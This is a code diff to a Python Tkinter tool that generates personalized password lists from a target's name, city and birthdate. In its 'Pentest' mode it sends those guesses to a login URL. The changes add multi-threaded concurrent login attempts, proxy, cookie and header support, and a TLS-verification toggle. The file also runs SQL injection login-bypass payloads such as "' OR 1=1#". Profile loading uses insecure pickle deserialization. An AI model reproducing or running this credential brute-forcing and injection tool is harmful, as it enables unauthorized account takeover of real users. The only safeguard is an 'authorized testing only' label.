@@ -3,13 +3,12 @@ import sys
 import gzip
 import json
 import time
-import math
 import queue
 import string
 import threading
 import itertools
 import re
-from urllib.parse import urlencode
+from collections import deque
 from datetime import datetime
 
 import tkinter as tk
@@ -33,6 +32,26 @@ except Exception:
     requests = None
 
 
+class RateLimiter:
+    def __init__(self, qps: float) -> None:
+        self.qps = max(0.1, float(qps))
+        self.lock = threading.Lock()
+        self.events: deque[float] = deque()
+
+    def acquire(self) -> None:
+        # Allow at most qps events per second across all threads
+        while True:
+            now = time.time()
+            with self.lock:
+                # Drop events older than 1 second
+                while self.events and now - self.events[0] > 1.0:
+                    self.events.popleft()
+                if len(self.events) < int(self.qps):
+                    self.events.append(now)
+                    return
+            time.sleep(0.01)
+
+
 class PasswordListGeneratorApp:
     def __init__(self) -> None:
         self.use_bootstrap = USE_TTKBOOTSTRAP
@@ -43,7 +62,7 @@ class PasswordListGeneratorApp:
         else:
             self.root = tk.Tk()
             self.root.title("Password List Generator")
-        self.root.geometry("900x700")
+        self.root.geometry("980x760")
 
         # State
         self.worker_thread: threading.Thread | None = None
@@ -85,12 +104,21 @@ class PasswordListGeneratorApp:
         self.var_qps = tk.DoubleVar(value=5.0)
         self.var_enable_sqli = tk.BooleanVar(value=False)
         self.var_sqli_field = tk.StringVar(value="password")  # username|password
+        self.var_concurrency = tk.IntVar(value=5)
+        self.var_headers_json = tk.StringVar(value="")
+        self.var_cookies = tk.StringVar(value="")  # k=v; k2=v2
+        self.var_proxy_url = tk.StringVar(value="")
+        self.var_verify_tls = tk.BooleanVar(value=True)
+        self.var_timeout = tk.DoubleVar(value=15.0)
 
         # Build UI
         self._build_ui()
 
-        # Start UI queue processing
+        # UI queue processing
         self.root.after(100, self._process_ui_queue)
+
+        # Graceful close
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
 
     def _default_output_path(self) -> str:
         timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
@@ -106,7 +134,6 @@ class PasswordListGeneratorApp:
         # Profile frame
         profile = ttk.LabelFrame(main, text="Profile")
         profile.pack(fill=tk.X, **padding)
-
         self._add_labeled_entry(profile, "Name", self.var_name, row=0, col=0)
         self._add_labeled_entry(profile, "Surname", self.var_surname, row=0, col=2)
         self._add_labeled_entry(profile, "City", self.var_city, row=1, col=0)
@@ -115,16 +142,12 @@ class PasswordListGeneratorApp:
         # Generation options
         options = ttk.LabelFrame(main, text="Options")
         options.pack(fill=tk.X, **padding)
-
         ttk.Label(options, text="Mode").grid(row=0, column=0, sticky="e", padx=4, pady=4)
         mode_combo = ttk.Combobox(options, textvariable=self.var_mode, values=["Brute-force", "Smart brute-force", "Smart mutations"], state="readonly", width=18)
         mode_combo.grid(row=0, column=1, sticky="w", padx=4, pady=4)
-
         self._add_labeled_spinbox(options, "Min length", self.var_min_len, row=0, col=2, from_=1, to=16)
         self._add_labeled_spinbox(options, "Max length", self.var_max_len, row=0, col=4, from_=1, to=24)
-
         self._add_labeled_entry(options, "Special chars", self.var_special_chars, row=1, col=0)
-
         ttk.Checkbutton(options, text="Include digits 0-9", variable=self.var_include_digits).grid(row=1, column=2, sticky="w", padx=4, pady=4)
         ttk.Checkbutton(options, text="Include uppercase", variable=self.var_include_uppercase).grid(row=1, column=4, sticky="w", padx=4, pady=4)
         ttk.Checkbutton(options, text="Gzip output (.gz)", variable=self.var_gzip).grid(row=1, column=5, sticky="w", padx=4, pady=4)
@@ -132,33 +155,34 @@ class PasswordListGeneratorApp:
             options.grid_columnconfigure(i, weight=1)
 
         # Target frame (pentest)
-        target = ttk.LabelFrame(main, text="Pentest Target (use only with explicit permission)")
+        target = ttk.LabelFrame(main, text="Pentest Target (authorized testing only)")
         target.pack(fill=tk.X, **padding)
-        ttk.Checkbutton(target, text="Send candidates to target (enable pentest)", variable=self.var_target_enabled).grid(row=0, column=0, columnspan=3, sticky="w", padx=4, pady=4)
-
+        ttk.Checkbutton(target, text="Enable Pentest (send candidates to target)", variable=self.var_target_enabled).grid(row=0, column=0, columnspan=4, sticky="w", padx=4, pady=4)
         self._add_labeled_entry(target, "URL", self.var_target_url, row=1, col=0)
         ttk.Label(target, text="Method").grid(row=1, column=2, sticky="e", padx=4, pady=4)
         ttk.Combobox(target, textvariable=self.var_http_method, values=["POST", "GET"], width=8, state="readonly").grid(row=1, column=3, sticky="w", padx=4, pady=4)
-
         self._add_labeled_entry(target, "Username value", self.var_username_value, row=2, col=0)
         self._add_labeled_entry(target, "Username param", self.var_user_param, row=2, col=2)
         self._add_labeled_entry(target, "Password param", self.var_pass_param, row=2, col=4)
-
         self._add_labeled_entry(target, "Extra params (k=v&k2=v2)", self.var_extra_params, row=3, col=0)
         self._add_labeled_entry(target, "Success codes (csv)", self.var_success_codes, row=3, col=2)
         self._add_labeled_entry(target, "Success regex (opt)", self.var_success_regex, row=3, col=4)
         self._add_labeled_entry(target, "Failure regex (opt)", self.var_failure_regex, row=4, col=0)
         self._add_labeled_entry(target, "Rate limit QPS", self.var_qps, row=4, col=2)
-
-        ttk.Checkbutton(target, text="Run SQL injection checks", variable=self.var_enable_sqli).grid(row=4, column=4, sticky="w", padx=4, pady=4)
-        ttk.Label(target, text="SQLi field").grid(row=4, column=5, sticky="e", padx=4, pady=4)
-        ttk.Combobox(target, textvariable=self.var_sqli_field, values=["username", "password"], width=10, state="readonly").grid(row=4, column=6, sticky="w", padx=4, pady=4)
-
-        for i in range(0, 7):
+        self._add_labeled_spinbox(target, "Concurrency", self.var_concurrency, row=4, col=4, from_=1, to=32)
+        ttk.Checkbutton(target, text="Run SQL injection checks", variable=self.var_enable_sqli).grid(row=4, column=6, sticky="w", padx=4, pady=4)
+        ttk.Label(target, text="SQLi field").grid(row=4, column=7, sticky="e", padx=4, pady=4)
+        ttk.Combobox(target, textvariable=self.var_sqli_field, values=["username", "password"], width=10, state="readonly").grid(row=4, column=8, sticky="w", padx=4, pady=4)
+        self._add_labeled_entry(target, "Headers JSON", self.var_headers_json, row=5, col=0)
+        self._add_labeled_entry(target, "Cookies (k=v; k2=v2)", self.var_cookies, row=5, col=2)
+        self._add_labeled_entry(target, "Proxy URL", self.var_proxy_url, row=5, col=4)
+        ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=5, column=6, sticky="w", padx=4, pady=4)
+        self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=5, col=7)
+        for i in range(0, 9):
             target.grid_columnconfigure(i, weight=1)
 
         # Output selection
-        out = ttk.LabelFrame(main, text="Output (ignored when pentest is enabled)")
+        out = ttk.LabelFrame(main, text="Output (ignored when Pentest is enabled)")
         out.pack(fill=tk.X, **padding)
         ttk.Label(out, text="File").grid(row=0, column=0, sticky="e", padx=4, pady=4)
         entry = ttk.Entry(out, textvariable=self.var_output_path)
@@ -192,7 +216,7 @@ class PasswordListGeneratorApp:
         # Preview/Log
         preview = ttk.LabelFrame(main, text="Output preview / Logs")
         preview.pack(fill=tk.BOTH, expand=True, **padding)
-        self.preview_text = scrolledtext.ScrolledText(preview, height=16)
+        self.preview_text = scrolledtext.ScrolledText(preview, height=20)
         self.preview_text.pack(fill=tk.BOTH, expand=True)
         self.preview_text.configure(state=tk.DISABLED)
 
@@ -249,7 +273,6 @@ class PasswordListGeneratorApp:
     def _append_preview(self, line: str) -> None:
         self.preview_text.configure(state=tk.NORMAL)
         self.preview_text.insert(tk.END, line + "\n")
-        # Limit preview size
         if float(self.preview_text.index('end-1c').split('.')[0]) > 5000:
             self.preview_text.delete('1.0', '2.0')
         self.preview_text.see(tk.END)
@@ -285,7 +308,6 @@ class PasswordListGeneratorApp:
     def on_generate(self) -> None:
         if self.is_running:
             return
-
         try:
             min_len = int(self.var_min_len.get())
             max_len = int(self.var_max_len.get())
@@ -296,12 +318,10 @@ class PasswordListGeneratorApp:
             return
 
         pentest_enabled = bool(self.var_target_enabled.get())
-
-        # Pentest validation
         pentest_args = {}
         if pentest_enabled:
             if requests is None:
-                messagebox.showerror("Missing dependency", "The 'requests' package is required for pentest mode.")
+                messagebox.showerror("Missing dependency", "The 'requests' package is required for Pentest mode.")
                 return
             url = self.var_target_url.get().strip()
             if not url:
@@ -318,6 +338,13 @@ class PasswordListGeneratorApp:
             fail_re = self._compile_regex(self.var_failure_regex.get())
             extra_params = self._parse_extra_params(self.var_extra_params.get())
             qps = max(0.1, float(self.var_qps.get() or 5.0))
+            headers = self._parse_headers_json(self.var_headers_json.get())
+            cookies = self._parse_cookies(self.var_cookies.get())
+            proxy = self.var_proxy_url.get().strip()
+            proxies = {'http': proxy, 'https': proxy} if proxy else None
+            verify_tls = bool(self.var_verify_tls.get())
+            timeout = float(self.var_timeout.get() or 15.0)
+            concurrency = max(1, int(self.var_concurrency.get() or 5))
             pentest_args = {
                 "enabled": True,
                 "url": url,
@@ -332,9 +359,14 @@ class PasswordListGeneratorApp:
                 "qps": qps,
                 "enable_sqli": bool(self.var_enable_sqli.get()),
                 "sqli_field": self.var_sqli_field.get(),
+                "headers": headers,
+                "cookies": cookies,
+                "proxies": proxies,
+                "verify": verify_tls,
+                "timeout": timeout,
+                "concurrency": concurrency,
             }
 
-        # Estimate totals
         mode = self.var_mode.get()
         if mode == "Brute-force":
             char_set = self._build_bruteforce_charset()
@@ -391,6 +423,21 @@ class PasswordListGeneratorApp:
         self.cancel_requested = True
         self.status_var.set("Canceling…")
 
+    def on_close(self) -> None:
+        # Graceful shutdown on window close
+        if self.is_running:
+            try:
+                self.cancel_requested = True
+                self.status_var.set("Canceling before exit…")
+                if self.worker_thread and self.worker_thread.is_alive():
+                    self.worker_thread.join(timeout=3.0)
+            except Exception:
+                pass
+        try:
+            self.root.destroy()
+        except Exception:
+            os._exit(0)
+
     def on_save_profile(self) -> None:
         profile = {
             "name": self.var_name.get(),
@@ -418,13 +465,22 @@ class PasswordListGeneratorApp:
             "qps": self.var_qps.get(),
             "enable_sqli": self.var_enable_sqli.get(),
             "sqli_field": self.var_sqli_field.get(),
+            "concurrency": self.var_concurrency.get(),
+            "headers_json": self.var_headers_json.get(),
+            "cookies": self.var_cookies.get(),
+            "proxy_url": self.var_proxy_url.get(),
+            "verify_tls": self.var_verify_tls.get(),
+            "timeout": self.var_timeout.get(),
         }
         path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
         if not path:
             return
-        with open(path, "w", encoding="utf-8") as f:
-            json.dump(profile, f, indent=2)
-        self._info("Profile saved")
+        try:
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump(profile, f, indent=2)
+            self._info("Profile saved")
+        except Exception as exc:
+            messagebox.showerror("Save failed", str(exc))
 
     def on_load_profile(self) -> None:
         path = filedialog.askopenfilename(filetypes=[("Profile JSON", "*.json"), ("Legacy pickle", "*.pkl"), ("All files", "*.*")])
@@ -435,7 +491,6 @@ class PasswordListGeneratorApp:
                 with open(path, "r", encoding="utf-8") as f:
                     profile = json.load(f)
             else:
-                # Legacy: try pickle
                 import pickle
                 with open(path, "rb") as f:
                     profile = pickle.load(f)
@@ -455,7 +510,6 @@ class PasswordListGeneratorApp:
         self.var_mode.set(profile.get("mode", "Brute-force"))
         self.var_gzip.set(bool(profile.get("gzip", False)))
 
-        # pentest
         self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
         self.var_target_url.set(profile.get("target_url", ""))
         self.var_http_method.set(profile.get("http_method", "POST"))
@@ -469,6 +523,12 @@ class PasswordListGeneratorApp:
         self.var_qps.set(float(profile.get("qps", 5.0)))
         self.var_enable_sqli.set(bool(profile.get("enable_sqli", False)))
         self.var_sqli_field.set(profile.get("sqli_field", "password"))
+        self.var_concurrency.set(int(profile.get("concurrency", 5)))
+        self.var_headers_json.set(profile.get("headers_json", ""))
+        self.var_cookies.set(profile.get("cookies", ""))
+        self.var_proxy_url.set(profile.get("proxy_url", ""))
+        self.var_verify_tls.set(bool(profile.get("verify_tls", True)))
+        self.var_timeout.set(float(profile.get("timeout", 15.0)))
 
         self._info("Profile loaded")
 
@@ -486,7 +546,6 @@ class PasswordListGeneratorApp:
         combined = (
             self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get()
         )
-        # unique characters preserving order
         seen = set()
         unique_chars = ''.join([c for c in combined if not (c in seen or seen.add(c))])
         if self.var_include_uppercase.get():
@@ -529,46 +588,59 @@ class PasswordListGeneratorApp:
         return self._geom_series(n, min_len, max_len) if n > 0 else 0
 
     def _worker(self, args: dict) -> None:
-        mode = args["mode"]
-        min_len = args["min_len"]
-        max_len = args["max_len"]
-        gzip_out = args["gzip"]
-        output_path = args["output_path"]
-        pentest = args.get("pentest", {"enabled": False})
-
-        # Pentest path
-        if pentest.get("enabled"):
-            completed, msg = self._worker_pentest(mode, min_len, max_len, pentest)
-            self.ui_queue.put(("done", completed, msg))
-            return
-
-        # File output path
         try:
-            if gzip_out:
-                f = gzip.open(output_path, "wt", encoding="utf-8")
-            else:
-                f = open(output_path, "w", encoding="utf-8")
-        except Exception as exc:
-            self.ui_queue.put(("message", f"Failed to open output file: {exc}"))
-            self.ui_queue.put(("done", 0, "Failed"))
-            return
+            mode = args["mode"]
+            min_len = args["min_len"]
+            max_len = args["max_len"]
+            gzip_out = args["gzip"]
+            output_path = args["output_path"]
+            pentest = args.get("pentest", {"enabled": False})
 
-        completed = 0
-        sample_sent = 0
-        start = self.start_time or time.time()
+            if pentest.get("enabled"):
+                completed, msg = self._worker_pentest(mode, min_len, max_len, pentest)
+                self.ui_queue.put(("done", completed, msg))
+                return
 
-        try:
-            if mode == "Brute-force":
-                charset = self._build_bruteforce_charset()
-                total = self._geom_series(len(charset), min_len, max_len)
-                self.total_estimated = total
-                for L in range(min_len, max_len + 1):
-                    if self.cancel_requested:
-                        break
-                    for tup in itertools.product(charset, repeat=L):
+            # File output path
+            try:
+                if gzip_out:
+                    f = gzip.open(output_path, "wt", encoding="utf-8")
+                else:
+                    f = open(output_path, "w", encoding="utf-8")
+            except Exception as exc:
+                self.ui_queue.put(("message", f"Failed to open output file: {exc}"))
+                self.ui_queue.put(("done", 0, "Failed"))
+                return
+
+            completed = 0
+            sample_sent = 0
+            start = self.start_time or time.time()
+
+            try:
+                if mode == "Brute-force":
+                    charset = self._build_bruteforce_charset()
+                    total = self._geom_series(len(charset), min_len, max_len)
+                    self.total_estimated = total
+                    for L in range(min_len, max_len + 1):
                         if self.cancel_requested:
                             break
-                        pwd = ''.join(tup)
+                        for tup in itertools.product(charset, repeat=L):
+                            if self.cancel_requested:
+                                break
+                            pwd = ''.join(tup)
+                            f.write(pwd + "\n")
+                            completed += 1
+                            if sample_sent < 50:
+                                self.ui_queue.put(("sample", pwd))
+                                sample_sent += 1
+                            if completed % 5000 == 0:
+                                elapsed = time.time() - start
+                                self.ui_queue.put(("progress", completed, self.total_estimated, elapsed))
+                elif mode == "Smart brute-force":
+                    self.total_estimated = self._estimate_smart_bruteforce_total(min_len, max_len)
+                    for pwd in self._smart_bruteforce_candidates(min_len, max_len):
+                        if self.cancel_requested:
+                            break
                         f.write(pwd + "\n")
                         completed += 1
                         if sample_sent < 50:
@@ -576,40 +648,30 @@ class PasswordListGeneratorApp:
                             sample_sent += 1
                         if completed % 5000 == 0:
                             elapsed = time.time() - start
-                            self.ui_queue.put(("progress", completed, self.total_estimated, elapsed))
-            elif mode == "Smart brute-force":
-                self.total_estimated = self._estimate_smart_bruteforce_total(min_len, max_len)
-                for pwd in self._smart_bruteforce_candidates(min_len, max_len):
-                    if self.cancel_requested:
-                        break
-                    f.write(pwd + "\n")
-                    completed += 1
-                    if sample_sent < 50:
-                        self.ui_queue.put(("sample", pwd))
-                        sample_sent += 1
-                    if completed % 5000 == 0:
-                        elapsed = time.time() - start
-                        self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
-            else:
-                for pwd in self._smart_candidates(min_len, max_len):
-                    if self.cancel_requested:
-                        break
-                    f.write(pwd + "\n")
-                    completed += 1
-                    if sample_sent < 50:
-                        self.ui_queue.put(("sample", pwd))
-                        sample_sent += 1
-                    if completed % 5000 == 0:
-                        elapsed = time.time() - start
-                        self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
-        finally:
-            try:
-                f.close()
-            except Exception:
-                pass
+                            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
+                else:
+                    for pwd in self._smart_candidates(min_len, max_len):
+                        if self.cancel_requested:
+                            break
+                        f.write(pwd + "\n")
+                        completed += 1
+                        if sample_sent < 50:
+                            self.ui_queue.put(("sample", pwd))
+                            sample_sent += 1
+                        if completed % 5000 == 0:
+                            elapsed = time.time() - start
+                            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
+            finally:
+                try:
+                    f.close()
+                except Exception:
+                    pass
 
-        self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), time.time() - start))
-        self.ui_queue.put(("done", completed, f"Completed. Generated {completed:,} candidates. Saved to: {output_path}"))
+            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), time.time() - start))
+            self.ui_queue.put(("done", completed, f"Completed. Generated {completed:,} candidates. Saved to: {output_path}"))
+        except Exception as exc:
+            self.ui_queue.put(("log", f"Worker crashed: {exc}"))
+            self.ui_queue.put(("done", 0, "Failed"))
 
     def _smart_tokens(self) -> list[str]:
         tokens: list[str] = []
@@ -739,7 +801,7 @@ class PasswordListGeneratorApp:
             for tup in itertools.product(charset, repeat=L):
                 yield ''.join(tup)
 
-    # Pentest helpers
+    # Pentest helpers and worker
     def _parse_codes(self, csv_codes: str) -> set[int]:
         result: set[int] = set()
         for part in (csv_codes or "").split(','):
@@ -770,6 +832,27 @@ class PasswordListGeneratorApp:
                 params[k.strip()] = v.strip()
         return params
 
+    def _parse_headers_json(self, raw: str) -> dict[str, str]:
+        if not raw:
+            return {}
+        try:
+            obj = json.loads(raw)
+            return obj if isinstance(obj, dict) else {}
+        except Exception:
+            self.ui_queue.put(("log", "Invalid headers JSON; ignoring."))
+            return {}
+
+    def _parse_cookies(self, raw: str) -> dict[str, str]:
+        result: dict[str, str] = {}
+        if not raw:
+            return result
+        parts = [p.strip() for p in raw.split(';') if p.strip()]
+        for p in parts:
+            if '=' in p:
+                k, v = p.split('=', 1)
+                result[k.strip()] = v.strip()
+        return result
+
     def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str):
         url = cfg['url']
         method = cfg['method']
@@ -779,9 +862,9 @@ class PasswordListGeneratorApp:
         data = {user_param: username, pass_param: password, **extra}
         try:
             if method == 'GET':
-                resp = sess.get(url, params=data, timeout=15)
+                resp = sess.get(url, params=data, timeout=cfg['timeout'])
             else:
-                resp = sess.post(url, data=data, timeout=15)
+                resp = sess.post(url, data=data, timeout=cfg['timeout'])
             return resp
         except Exception as exc:
             self.ui_queue.put(("log", f"Request error: {exc}"))
@@ -812,11 +895,23 @@ class PasswordListGeneratorApp:
             "' OR 1=1#",
         ]
 
+    def _configure_session(self, sess: requests.Session, cfg: dict) -> None:
+        try:
+            if cfg.get('headers'):
+                sess.headers.update(cfg['headers'])
+            if cfg.get('cookies'):
+                sess.cookies.update(cfg['cookies'])
+            if cfg.get('proxies'):
+                sess.proxies.update(cfg['proxies'])
+            sess.verify = cfg.get('verify', True)
+        except Exception as exc:
+            self.ui_queue.put(("log", f"Session configuration error: {exc}"))
+
     def _run_sqli_checks(self, sess: requests.Session, cfg: dict) -> tuple[bool, str]:
         field = cfg.get('sqli_field', 'password')
         username = cfg['username']
         self.ui_queue.put(("log", f"[SQLi] Starting checks on {field} field…"))
-        interval = 1.0 / max(0.1, cfg['qps'])
+        limiter = RateLimiter(cfg['qps'])
         for payload in self._sqli_payloads():
             if self.cancel_requested:
                 break
@@ -824,29 +919,41 @@ class PasswordListGeneratorApp:
                 u, p = payload, 'x'
             else:
                 u, p = username, payload
+            limiter.acquire()
             resp = self._http_attempt(sess, cfg, u, p)
-            time.sleep(interval)
             if self._is_success(resp, cfg):
                 msg = f"[SQLi] Possible SQL injection success with {field} payload: {payload!r}"
                 self.ui_queue.put(("log", msg))
                 return True, msg
             else:
-                self.ui_queue.put(("log", f"[SQLi] payload tried: {payload!r} -> status {getattr(resp, 'status_code', '?')}"))
+                code = getattr(resp, 'status_code', '?')
+                self.ui_queue.put(("log", f"[SQLi] tried: {payload!r} -> status {code}"))
         return False, ""
 
     def _worker_pentest(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
-        sess = requests.Session()
         completed = 0
+        found_msg = ""
         start = self.start_time or time.time()
-        interval = 1.0 / max(0.1, cfg['qps'])
+        limiter = RateLimiter(cfg['qps'])
+        total_ref = max(self.total_estimated, 1)
 
-        # Optional SQLi pre-checks
-        if cfg.get('enable_sqli'):
-            ok, msg = self._run_sqli_checks(sess, cfg)
-            if ok:
-                return completed, msg
+        # Optional SQLi pre-checks (single-thread)
+        try:
+            base_sess = requests.Session()
+            self._configure_session(base_sess, cfg)
+            if cfg.get('enable_sqli'):
+                ok, msg = self._run_sqli_checks(base_sess, cfg)
+                if ok:
+                    return completed, msg
+        except Exception as exc:
+            self.ui_queue.put(("log", f"Pentest setup error: {exc}"))
+        finally:
+            try:
+                base_sess.close()
+            except Exception:
+                pass
 
-        # Generate candidates from selected mode and attempt
+        # Prepare generator
         if mode == 'Brute-force':
             generator = self._bruteforce_stream(min_len, max_len)
         elif mode == 'Smart brute-force':
@@ -854,22 +961,94 @@ class PasswordListGeneratorApp:
         else:
             generator = self._smart_candidates(min_len, max_len)
 
-        found_msg = ""
-        for pwd in generator:
-            if self.cancel_requested:
-                break
-            resp = self._http_attempt(sess, cfg, cfg['username'], pwd)
-            completed += 1
-            if completed % 100 == 0:
-                elapsed = time.time() - start
-                self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
-            if completed <= 50:
-                self.ui_queue.put(("sample", f"TRY {cfg['username']} : {pwd}"))
-            if self._is_success(resp, cfg):
-                found_msg = f"SUCCESS: {cfg['username']} / {pwd}"
-                self.ui_queue.put(("log", found_msg))
-                break
-            time.sleep(interval)
+        # Shared structures
+        q = queue.Queue(maxsize=2000)
+        stop_event = threading.Event()
+        progress_lock = threading.Lock()
+
+        # Producer
+        def producer():
+            try:
+                for pwd in generator:
+                    if self.cancel_requested or stop_event.is_set():
+                        break
+                    try:
+                        q.put(pwd, timeout=0.5)
+                    except queue.Full:
+                        if self.cancel_requested or stop_event.is_set():
+                            break
+                        continue
+            except Exception as exc:
+                self.ui_queue.put(("log", f"Producer error: {exc}"))
+            finally:
+                # Signal no more items
+                for _ in range(cfg['concurrency']):
+                    try:
+                        q.put_nowait(None)
+                    except Exception:
+                        pass
+
+        # Worker function
+        def worker(worker_id: int):
+            nonlocal completed, found_msg
+            sess = requests.Session()
+            self._configure_session(sess, cfg)
+            try:
+                while not self.cancel_requested and not stop_event.is_set():
+                    try:
+                        item = q.get(timeout=0.5)
+                    except queue.Empty:
+                        continue
+                    if item is None:
+                        break
+                    pwd = item
+                    try:
+                        limiter.acquire()
+                        resp = self._http_attempt(sess, cfg, cfg['username'], pwd)
+                        with progress_lock:
+                            completed += 1
+                            if completed % 100 == 0:
+                                elapsed = time.time() - start
+                                self.ui_queue.put(("progress", completed, max(total_ref, completed), elapsed))
+                            if completed <= 50:
+                                self.ui_queue.put(("sample", f"TRY {cfg['username']} : {pwd}"))
+                        if self._is_success(resp, cfg):
+                            found_msg = f"SUCCESS: {cfg['username']} / {pwd}"
+                            self.ui_queue.put(("log", found_msg))
+                            stop_event.set()
+                            break
+                    except Exception as exc:
+                        self.ui_queue.put(("log", f"Worker {worker_id} error: {exc}"))
+                    finally:
+                        try:
+                            q.task_done()
+                        except Exception:
+                            pass
+            finally:
+                try:
+                    sess.close()
+                except Exception:
+                    pass
+
+        # Start threads
+        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(cfg['concurrency'])]
+        prod_thread = threading.Thread(target=producer, daemon=True)
+        prod_thread.start()
+        for t in threads:
+            t.start()
+
+        # Wait for completion
+        try:
+            q.join()
+        except Exception:
+            pass
+        stop_event.set()
+        # Wait a short moment for workers to exit
+        for t in threads:
+            try:
+                t.join(timeout=1.0)
+            except Exception:
+                pass
 
         if not found_msg:
             found_msg = f"Pentest run finished. Attempts: {completed:,}. No success criteria met."
@@ -881,8 +1060,34 @@ class PasswordListGeneratorApp:
             for tup in itertools.product(charset, repeat=L):
                 yield ''.join(tup)
 
+    def _estimate_smart_bruteforce_total(self, min_len: int, max_len: int) -> int:
+        charset = self._build_bruteforce_charset()
+        if charset:
+            freq = {}
+            for ch in (self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get() + self.var_special_chars.get()):
+                if not ch:
+                    continue
+                freq[ch] = freq.get(ch, 0) + 1
+            sorted_chars = [c for c, _ in sorted(freq.items(), key=lambda kv: kv[1], reverse=True)]
+            reduced = ''.join(sorted(set((sorted_chars + list(charset)))))
+            charset = ''.join(list(reduced)[:12])
+        n = len(charset)
+        return self._geom_series(n, min_len, max_len) if n > 0 else 0
+
     def run(self) -> None:
-        self.root.mainloop()
+        try:
+            self.root.mainloop()
+        except Exception as exc:
+            # Last-resort graceful exit
+            try:
+                self.ui_queue.put(("log", f"Fatal UI error: {exc}"))
+            except Exception:
+                pass
+            finally:
+                try:
+                    self.root.destroy()
+                except Exception:
+                    os._exit(1)
 
 
 if __name__ == "__main__":
